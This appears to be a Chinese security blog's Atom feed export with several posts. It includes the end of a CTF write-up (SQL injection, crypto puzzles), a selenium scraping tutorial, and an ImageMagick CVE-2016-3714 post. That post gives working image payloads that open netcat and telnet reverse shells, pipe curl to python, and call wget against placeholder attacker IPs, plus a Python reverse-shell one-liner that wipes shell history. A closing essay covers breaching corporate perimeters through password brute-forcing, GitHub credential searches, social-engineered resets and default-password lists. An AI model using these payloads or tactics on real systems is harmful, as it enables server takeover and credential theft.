+<p>右键源代码，发现<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">css/[adwxhyz]&#123;2&#125;ctf[0-9]&#123;7&#125;.css"</span><br></pre></td></tr></table></figure></p>
+<p>前两位字符，后7位数字的正则，大胆猜测前两位是wh，后7位直到官方给了提示（），一个qq号，搜索qq的资料，发现其为1999年5月12的生日，尝试css/whctf1999512.css成功，flag就在里面<code>whctf{Wh3tF_H@rd}</code></p>
+<p><strong>0x05. beat it</strong></p>
+<p>打开又是一个pcap的包下载，三个ipv4的协议包，尝试重组将中间的丢弃，把data组合hex两次转字符串，得到flag<code>whctf{000 here it is the flag 000}</code></p>
+<p><strong>0x06. 密码忘了怎么办？</strong></p>
+<p>登录口sql注入，还是union的，注入发现user表有flag字段，将12,13,14,15行的flag字段组合<br><code>whctf{hello$$##itisme&amp;---&amp;&amp;&amp;}</code></p>
+<p><strong>0x07. 看图说话</strong></p>
+<p>给的提示里ctf页面脚本,猜测存在ctf.php，打开是302跳转，返回包里有张图片链接<br><code>templates/images/xxx/ctf.jpg</code><br>，将图片下载下载利用notepad++打开，flag在最后<code>whctf{today@@isnot09#$tomorrow}</code></p>
+<h2 id="CRYPTO题"><a href="#CRYPTO题" class="headerlink" title="CRYPTO题"></a>CRYPTO题</h2><p><strong>0x01 我叫李二狗（一）</strong><br>直接base64解密，然后李二狗是近视，将l换成1，x换成1，o换成0，解密发现是left16加密方式。</p>
+<p><strong>0x02 李二狗的梦中情人</strong><br>将隐藏在图片末尾的链接中的图片提取出来，然后convert转换成png格式，diffimg下得到一个二维码，二维码黑白反转下，得到正确的二维码，扫一下，bingo</p>
+<p><strong>0x03 我叫李二狗（二）</strong><br>给了两个RSA加密，由于其弱公钥，N太小，直接分解大数，破解</p>
+<p><strong>0x04 李二狗的LOL战歌</strong><br>听音乐，感觉音频右声道像电报，然后翻译成摩斯编码，直接得到13位字符，然后用ROT13编码转换下，得到flag</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;whctf2016初赛提前结束了，团队的小伙伴们还是很给力的，做出了所有的web及几乎所有（差一道）的crypto题。&lt;/p&gt;
+&lt;h2 id=&quot;Web题&quot;&gt;&lt;a href=&quot;#Web题&quot; class=&quot;headerlink&quot; title=&quot;Web题&quot;&gt;&lt;/a&gt;Web题
+    
+    </summary>
+    
+      <category term="ctf相关" scheme="http://yoursite.com/categories/ctf%E7%9B%B8%E5%85%B3/"/>
+    
+    
+      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>利用phantomjs+selenium抓取js执行后的结果</title>
+    <link href="http://yoursite.com/2016/05/12/%E5%88%A9%E7%94%A8phantomjs+selenium%E6%8A%93%E5%8F%96js%E6%89%A7%E8%A1%8C%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C/"/>
+    <id>http://yoursite.com/2016/05/12/利用phantomjs+selenium抓取js执行后的结果/</id>
+    <published>2016-05-12T02:29:30.603Z</published>
+    <updated>2016-05-12T07:44:28.859Z</updated>
+    
+    <content type="html"><![CDATA[<p>0x01 问题需求<br>有需要写一个接口需要可以抓取360webscan的网站评分及漏洞情况，本来以为一个简单的爬虫就能搞定的。哪想到把网页抓下来后一下子就懵逼了，先看获取分数的地方<a id="more"></a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;  	</span><br><span class="line"></span><br><span class="line">				url : <span class="string">"/webscore/index"</span>,</span><br><span class="line"></span><br><span class="line">				type: <span class="string">'POST'</span>,</span><br><span class="line"></span><br><span class="line">				dataType:  <span class="string">'json'</span>,</span><br><span class="line"></span><br><span class="line">				data:<span class="string">'isxujia='</span>+isxujia+<span class="string">'&amp;iscuangai='</span>+iscuangai+<span class="string">'&amp;isviolation='</span>+isviolation+<span class="string">'&amp;isguama='</span>+isguama+<span class="string">'&amp;high='</span>+high+<span class="string">'&amp;mid='</span>+mid+<span class="string">'&amp;low='</span>+low+<span class="string">'&amp;info='</span>+info+<span class="string">'&amp;domain=www.natco.top&amp;pangzhu='</span>+pangzhu,</span><br><span class="line"></span><br><span class="line">				success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br></pre></td></tr></table></figure></p>
+<p>先看这一段ajax请求，把url的参数连同isxujia（是否虚假）等参数向服务器请求后，获取得分。那么isxujia等参数从哪里来？再往上看<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line"></span><br><span class="line">			  url: <span class="string">"/index/gettrojan"</span>,</span><br><span class="line"></span><br><span class="line">			  type:<span class="string">"POST"</span>,</span><br><span class="line"></span><br><span class="line">			  dataType:<span class="string">"json"</span>,</span><br><span class="line"></span><br><span class="line">			  data:<span class="string">"url="</span>+url+<span class="string">"&amp;token=34e08ea449361738107148de883678c4&amp;time=1462934864"</span>,</span><br><span class="line"></span><br><span class="line">			  success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;	</span><br><span class="line"></span><br><span class="line">			        <span class="keyword">var</span> type = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">var</span> st = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">var</span> sc = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">var</span> ssc = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">var</span> trojan_list = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">var</span> isxujia = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
+<p>简单的看了下，就是这个ajax请求（带token）返回的type，st等参数经过一些条件判断，计算isxujia是否为1。由于有token，这个地方就没办法自己在python里将计算过程复现了。剩下的路就是要抓取js渲染过后的页面值了，网上最成熟的方法就是phantomjs+selenium。</p>
+<hr>
+<p>0x02 环境配置<br><strong>Selenium</strong>是一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE、Mozilla Firefox、Chrome等。<br><strong>Phantom JS</strong>是一个服务器端的 JavaScript API 的 WebKit。其支持各种Web标准： DOM 处理, CSS 选择器, JSON, Canvas, 和 SVG。<br>在kali2.0环境下，先安装Selenium: <code>sudo apt-get install selenium</code><br>再安装Phantom JS，官方网站下载页面：<a href="http://phantomjs.org/download.html" target="_blank" rel="external">传送门</a>，根据自己的系统版本下载，并配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/share</span><br><span class="line">sudo wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2</span><br><span class="line">sudo tar -xvf phantomjs-2.1.1-linux-x86_64.tar.bz2</span><br><span class="line">sudo ln -s /usr/local/share/phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/local/share/phantomjs</span><br><span class="line">sudo ln -s /usr/local/share/phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/local/bin/phantomjs</span><br><span class="line">sudo ln -s /usr/local/share/phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/bin/phantomjs</span><br></pre></td></tr></table></figure></p>
+<p>0x03 demo<br>这里phantomjs的可执行路径为’/usr/bin/phantomjs’，下面是个小的demo<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.PhantomJS(executable_path=<span class="string">'/usr/bin/phantomjs'</span>) <span class="comment">#注意这里的执行路径</span></span><br><span class="line">driver.get(<span class="string">"http://phperz.com/"</span>)</span><br><span class="line">driver.find_element_by_id(<span class="string">'search_form_input_homepage'</span>).send_keys(<span class="string">'Nirvana'</span>)</span><br><span class="line">driver.find_element_by_id(<span class="string">"search_button_homepage"</span>).click()</span><br><span class="line"><span class="keyword">print</span> driver.current_url</span><br><span class="line">driver.quit() <span class="comment">#注意要退出</span></span><br></pre></td></tr></table></figure></p>
+<p>主要是通过selenium获取js渲染后的dom节点的值。</p>
+<p>参考链接：<br><a href="http://ohroot.com/2014/11/11/phantomjs%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/" target="_blank" rel="external">http://ohroot.com/2014/11/11/phantomjs%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;0x01 问题需求&lt;br&gt;有需要写一个接口需要可以抓取360webscan的网站评分及漏洞情况，本来以为一个简单的爬虫就能搞定的。哪想到把网页抓下来后一下子就懵逼了，先看获取分数的地方
+    
+    </summary>
+    
+      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ImageMagick 漏洞测试</title>
+    <link href="http://yoursite.com/2016/05/12/ImageMagick%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"/>
+    <id>http://yoursite.com/2016/05/12/ImageMagick漏洞测试/</id>
+    <published>2016-05-11T16:00:00.000Z</published>
+    <updated>2016-05-15T12:40:07.280Z</updated>
+    
+    <content type="html"><![CDATA[<p>&emsp;&emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。<a id="more"></a>由此漏洞延伸，ImageMagick被许多编程语言所支持，包括Perl，C++，PHP（通过imagick拓展），Python和Ruby等，并被部署在数以百万计的网站，博客，社交媒体平台和流行的内容管理系统(CMS)，例如WordPress和Drupal。<br>&emsp;&emsp;利用这个漏洞，可以通过上传一张含有恶意代码的图片，可导致命令执行。这里我们主要讲的是如何测试漏洞，可以写文件、反弹shell、wget等。本地搭建一个测试环境，在kali2.0中，lamp环境下，安装了php的imagick扩展，调用ImageMagick进行上传的图片处理<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]&gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $dest_file = <span class="string">"./images/"</span>.md5(uniqid(rand())).<span class="string">".png"</span>;</span><br><span class="line">    $thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">    $thumb-&gt;readImage($temp_file);</span><br><span class="line">    $thumb-&gt;writeImage($dest_file);</span><br><span class="line">    $thumb-&gt;clear();</span><br><span class="line">    $thumb-&gt;destroy();</span><br><span class="line">    unlink($temp_file);</span><br><span class="line">    <span class="keyword">echo</span> $dest_file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>1. netcat</strong><br>前提是server服务器上安装了netcat，poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|nc xxx.xxx.xxx.xxx 2015 -e /bin/bash&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
+<p>在反弹的监听主机上监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 2015</span><br></pre></td></tr></table></figure></p>
+<p>测试处，点击上传后<br><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2tD8LoFXXXXbNXFXXXXXXXXXX_!!792076116.png" alt=""><br><strong>2. telnet</strong><br>telnet在linux的各大发行版中telnet一般默认安装，poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|telnet x.x.x.x 2015&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
+<p>在反弹的监听主机上监听，指令同上<br><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2UKp5oFXXXXbIXpXXXXXXXXXX_!!792076116.png" alt=""><br><strong>3. curl&amp;python</strong><br>利用curl下载python文件后，执行python脚本反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://1&quot;||curl -sS http://x.x.x.x/test.py | python&quot;)&apos;</span><br><span class="line">pop graphic-contex</span><br></pre></td></tr></table></figure></p>
+<p>这里需要一个外网服务器存放你的脚本,python脚本内容如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,socket,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">2015</span>));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);os.unsetenv(<span class="string">"HISTFILE"</span>);os.unsetenv(<span class="string">"HISTFILESIZE"</span>);os.unsetenv(<span class="string">"HISTSIZE"</span>);os.unsetenv(<span class="string">"HISTORY"</span>);os.unsetenv(<span class="string">"HISTSAVE"</span>);os.unsetenv(<span class="string">"HISTZONE"</span>);os.unsetenv(<span class="string">"HISTLOG"</span>);os.unsetenv(<span class="string">"HISTCMD"</span>);os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">"/dev/null"</span>);os.putenv(<span class="string">"HISTSIZE"</span>,<span class="string">"0"</span>);os.putenv(<span class="string">"HISTFILESIZE"</span>,<span class="string">"0"</span>);pty.spawn(<span class="string">"/bin/sh"</span>);s.close()</span><br></pre></td></tr></table></figure></p>
+<p>注意更改脚本里的反弹ip和端口，测试成功<br><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2v4GmoFXXXXb7XXXXXXXXXXXX_!!792076116.png" alt=""><br><strong>4. wget</strong><br>在远程服务上写个php脚本记录访问ip，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">file_put_contents(<span class="string">"log.txt"</span>, <span class="string">"ping from "</span>.$ip, FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|wget http://x.x.x.x/img.php&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
+<p>命令执行成功，则在log.txt中会记录来访ip<br><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2qROpoFXXXXblXpXXXXXXXXXX_!!792076116.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&amp;emsp;&amp;emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="poc" scheme="http://yoursite.com/tags/poc/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>浅谈企业网络边界</title>
+    <link href="http://yoursite.com/2016/03/07/%E6%B5%85%E8%B0%88%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%BE%B9%E7%95%8C/"/>
+    <id>http://yoursite.com/2016/03/07/浅谈企业网络边界/</id>
+    <published>2016-03-06T16:00:00.000Z</published>
+    <updated>2016-05-15T12:40:15.291Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x01-企业网络边界"><a href="#0x01-企业网络边界" class="headerlink" title="0x01 企业网络边界"></a>0x01 企业网络边界</h2><p>&emsp;&emsp;我们知道既然要从外围进入内网，那么必然要做的一件事情就是跨越边界，所有这个命门我们也就自然应该在企业的内外网边界上来寻找。<a id="more"></a><br>&emsp;&emsp;那为什么企业需要在内外网之间部署这样一个边界呢？我们只要作为一个大企业来说他会有上百甚至上千个业务线，而安全团队或许只有几十人，那这几十人要保证这上千个业务线的安全，显然如果用布点的方式肯定无法完成覆盖的，所以企业在思考如何进行防御的时候会选择区域性防守。<br>&emsp;&emsp;所谓区域性防守就是把重点需要保护的业务&amp;数据放到一个指定的区域，让后对这个区域进行隔离，并指定好进入这个区域的防火墙策略。然后定期对这个区域进行安全检查。<br>&emsp;&emsp;如果这样实施的很好，看起来一切都很完美。但是事实上并不尽人意，事实是这样的，在企业内部通常业务部门是会比安全部门强势的，这一点我相信大家都知道，那么就会导致一个问题，安全部门总想着把业务圈起来，各种严格的策略和规范实施上去，而业务部门在业务快速迭代的背景下就会很难去严格执行你的策略。他们会要求你针对他特殊的业务场景来制定专门的策略，甚至部署到非隔离区域，而且这样的情况不在少数。如此一来安全部门需要维护的策略和规范就会越来越多。而这将直接导致策略及规范的执行越来越差。</p>
+<h2 id="0x02-合法的入口"><a href="#0x02-合法的入口" class="headerlink" title="0x02 合法的入口"></a>0x02 合法的入口</h2><h3 id="1-物理接触"><a href="#1-物理接触" class="headerlink" title="1. 物理接触"></a>1. 物理接触</h3><p>&emsp;&emsp;如果你能直接物理接触公司内网（插网线或者连接wifi），我只能说你牛B。案例：</p>
+<ul>
+<li><a href="http://www.wooyun.org/bugs/wooyun-2015-0108465" target="_blank" rel="external">看我如何用wifi万能钥匙物理撸穿京东漫游内网</a></li>
+<li><a href="http://www.wooyun.org/bugs/wooyun-2010-0149911" target="_blank" rel="external">线下测试最终进入小米关键系统</a></li>
+</ul>
+<p>&emsp;&emsp;这两个案例都是通过wifi万能钥匙（手机root后即可看到连接过的wifi密码），获取到wifi密码，直接连入内网。内网的系统安全性一般不高，或弱口令、xss、注入。甚至还可以进行嗅探、钓鱼及流量劫持等。</p>
+<h3 id="2-非物理接触"><a href="#2-非物理接触" class="headerlink" title="2. 非物理接触"></a>2. 非物理接触</h3><p>&emsp;&emsp;大型的公司，一般都会有很多的管理系统，如果每个系统都分配给员工账号的话，那么需要记住太多的账号密码了。所以大型公司通常有一个主账号，一般是OA系统、vpn或者统一认证入口，员工登录这个账号，可对其他的系统进行授权。这种方式虽然解放了员工，同时相对也比较安全（账号密码太多难免有弱口令）。但是凡事有利有弊，万一某一名员工的账号泄露或者是弱口令，那么它所授权的所有系统都可被攻击者访问。</p>
+<h4 id="2-1-获取用户名密码的方式"><a href="#2-1-获取用户名密码的方式" class="headerlink" title="2.1  获取用户名密码的方式"></a>2.1  获取用户名密码的方式</h4><ul>
+<li>用户名密码爆破</li>
+</ul>
+<p>&emsp;&emsp; 最常用方法当然是爆破。若统一认证处无法爆破，推荐爆破邮箱；若登录处有验证码，但是不复杂，推荐pkav的可识别简单验证码的爆破工具；若是ip限制，看是否是cookie记录限制，若不是又没有很多代理的话，还是放弃吧。对于用户名，最好是能收集到他们公司的一些人名或者是用户名，如果收集不到就使用自带的top500人名。密码一般top100。</p>
+<p>参考：</p>
+<blockquote>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0133393" target="_blank" rel="external">中粮集团某处设计不当导致进入内网（可入多系统/泄露大量信息）</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-0165182" target="_blank" rel="external">途牛内网漫游（内网大量数据库权限/大量用户信息/天猫商城、积分商城及主站后台权限）</a></p>
+</blockquote>
+<ul>
+<li>社工（github、社工库）</li>
+</ul>
+<p>&emsp;&emsp; 都说现在是大数据的时代，社工永远是个有效方法。程序猿们一不小心把代码传到github上，代码里恰巧有邮箱，密码等信息，很容易被攻击者搜索到。常用语法，以饿了么为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smtp ele.me</span><br><span class="line">ele.me pass</span><br><span class="line">mail @ele.me</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp; 拥有大数据，直接在社工库里搜索某公司的企业邮箱域名，如@ele.me。有的人虽然密码挺复杂，但如果是万年一个密码，也是相当的危险。<br>参考：</p>
+<blockquote>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0147179" target="_blank" rel="external">美团网某处内部邮箱账号泄露可登录（已连接vpn）</a></p>
+</blockquote>
+<ul>
+<li>密码重置</li>
+</ul>
+<p>&emsp;&emsp; 试想如果员工想更改自己的vpn密码，那么有什么好的方法呢？如果不是要员工直接走到运维办公室里，出示证件的话，那么就一定有东西可被两方信任，通常是邮箱+个人信息。如果我直接发邮件给运维，说我vpn密码忘记了，再出示一些个人信息，你说运维会不会给我改？<br>参考：</p>
+<blockquote>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0150946" target="_blank" rel="external">华润双鹤由邮箱到集团内网漫游</a><br><a href="http://www.wooyun.org/bugs/wooyun-2015-0150613" target="_blank" rel="external">控制魅族在线商店突破vpn双因素进入内网（涉及大量用户详细订单/手机IMEI等）</a></p>
+</blockquote>
+<h4 id="2-2-谈谈用户名和密码"><a href="#2-2-谈谈用户名和密码" class="headerlink" title="2.2  谈谈用户名和密码"></a>2.2  谈谈用户名和密码</h4><ul>
+<li>用户名</li>
+</ul>
+<p>&emsp;&emsp; 为了方便管理以及员工方便记忆，员工的用户名一般是自己的拼音，最常用的是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zhangwei</span><br><span class="line">wangwei</span><br><span class="line">wangfang</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp; 还有这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wei.zhang</span><br><span class="line">wei.wang</span><br><span class="line">fang.wang</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp; 正序，反序，简写可组合多达6种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zhangwei</span><br><span class="line">zw</span><br><span class="line">zhang.wei</span><br><span class="line">wei.zhang</span><br><span class="line">zhangw</span><br><span class="line">w.zhang</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp; 所以也不是看到登录口，就拿top500人名字典去尝试；事先清楚某公司的用户名规则，会使得爆破的准确性和效率更高。话说随着人口的增长（作文写多了），大公司重名的概率，或者相似名（拼音相同）的概率是相当大的。如<figure class="highlight plain"><figcaption><span>李伟，李威，李维，李卫```,那么为了区分这种情况，就有了下面的：</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">liwei01</span><br><span class="line">liwei02</span><br><span class="line">liwei03</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
+<p>当然最准确的还是先拿下某个邮箱或oa账号后，将里面的通讯录导出来！！！<br>参考：</p>
+<blockquote>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0134278" target="_blank" rel="external">对中粮集团的多个系统的渗透测试（已入多个系统）</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-0133495" target="_blank" rel="external">字典大法好之可进入百度糯米运营支撑平台/大客户广告系统/可能进一步入内网</a></p>
+</blockquote>
+<ul>
+<li>密码</li>
+</ul>
+<p>&emsp;&emsp;密码向来是个难题。这里我把密码分成两种：一是通用型，类似弱口令top10，top100等，相信每个大牛手里都有自己独特的不轻易外传的密码字典；二是针对特定的用户名、公司、系统，从而生成的字典。<br>&emsp;&emsp;通用的top100我就不说了，但是有一类密码普通人不常用，但程序猿特别爱用的，人称<strong>滚键盘</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">q2w3e4r5t</span><br><span class="line">1qaz@WSX</span><br><span class="line">123456asd</span><br><span class="line">1q2w3e</span><br><span class="line">1qaz@WSX</span><br><span class="line">ZAQ!xsw2</span><br><span class="line">ZAQ!2wsx</span><br><span class="line">2wsx#EDC</span><br><span class="line">@WSX3edc</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这种密码我建议可以加入自己的字典，通常有奇效。<br>&emsp;&emsp;如果已经有了可靠的用户名，那么不妨针对这些用户名制作相应的字典，例如<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">liwei</span><br><span class="line">liwei1989</span><br><span class="line">liwei@1989</span><br><span class="line">1iwei@scu</span><br><span class="line">liweiscu</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;公司在给员工分配密码的时候，一般都是会有一个默认密码，员工拿到后进行修改。但若是某些员工没有更改密码，那么就可以被利用了。不同公司的默认密码不一样，例如饿了么的常用默认密码，和其公司域名有很大的关系。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ele.me</span><br><span class="line">ele@123</span><br><span class="line">ele.me@123</span><br><span class="line">ele.me5121314</span><br><span class="line">ele@123456789</span><br><span class="line">eleme@3456789</span><br><span class="line">Hello_eleme123</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03-不合法的入口"><a href="#0x03-不合法的入口" class="headerlink" title="0x03 不合法的入口"></a>0x03 不合法的入口</h2><blockquote>
+<p>不合法的入口一般指利用漏洞获取某内网机器权限，或者是利用漏洞绕过边界，这方面就不多说。</p>
+</blockquote>
+<ul>
+<li>利用各种漏洞，获取边界某台服务器权限<br>这是最常见的方式，漏洞包括web漏洞、主机漏洞及其他。正如前面所说的，大公司的安全运维人员需要维护数以千计的业务，其中很多的边缘业务肯定是无法完全的保护起来，这些边缘的业务可能长时间无人维护，但却又是在边界上可和内网通信。正所谓“千里之堤，毁于蚁穴”，企业的内部往往是很脆弱的，一旦让攻击者进入边界以内，就如同砧板上的肉，任人宰割。<br>案例：<br><a href="http://www.wooyun.org/bugs/wooyun-2015-0129012" target="_blank" rel="external">东风汽车公司某系统漏洞导致内网漫游（控制大量服务器/数据库/ftp，大量敏感数据泄漏)</a></li>
